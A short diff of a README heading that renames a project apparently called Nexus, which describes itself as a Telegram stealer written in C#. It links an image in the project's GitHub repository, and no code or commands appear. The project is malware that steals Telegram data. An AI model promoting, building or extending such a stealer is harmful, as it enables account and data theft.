@@ -1,5 +1,5 @@
-# 🔱 Nexus-v1.0
-### 💮 Telegram Stealer Written in C#
+# 🔱 Nexus
+### 💮 Telegram Stealer Written In C#
 
 ![Image of Stalin](https://github.com/Rang0ku/Nexus-v1.0/blob/master/image/nexus.png)
 
